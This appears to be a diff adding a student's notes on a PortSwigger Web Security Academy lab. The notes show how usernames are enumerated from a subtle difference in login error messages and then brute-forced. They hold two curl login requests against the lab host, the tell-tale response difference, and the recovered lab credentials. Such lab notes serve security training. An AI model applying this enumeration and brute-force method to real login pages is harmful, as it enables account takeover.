@@ -1,0 +1,29 @@
+
+
+BruteForce Username and check resulat
+
+invalid Username:
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: 0a0300b5038c47d484b7bdcd007f0015.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 29' -H $'Origin: https://0a0300b5038c47d484b7bdcd007f0015.web-security-academy.net' -H $'Referer: https://0a0300b5038c47d484b7bdcd007f0015.web-security-academy.net/login' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' -H $'Connection: keep-alive' \
+    -b $'session=K3YWlrSgRBj9LpfINvuyAXsUJRtbXMHT' \
+    --data-binary $'username=carlos&password=test' \
+    $'https://0a0300b5038c47d484b7bdcd007f0015.web-security-academy.net/login'
+
+vaid Username:
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: 0a0300b5038c47d484b7bdcd007f0015.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 30' -H $'Origin: https://0a0300b5038c47d484b7bdcd007f0015.web-security-academy.net' -H $'Referer: https://0a0300b5038c47d484b7bdcd007f0015.web-security-academy.net/login' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' -H $'Connection: keep-alive' \
+    -b $'session=K3YWlrSgRBj9LpfINvuyAXsUJRtbXMHT' \
+    --data-binary $'username=ansible&password=test' \
+    $'https://0a0300b5038c47d484b7bdcd007f0015.web-security-academy.net/login'
+	
+	
+Just diffrence in " . "
+Proggramer mistake in response :
+	Invalid username or password. --> invalid
+	Invalid username or password  --> valid
+	
+	
+then BruteForce Password:
+	username=ansible&password=abc123
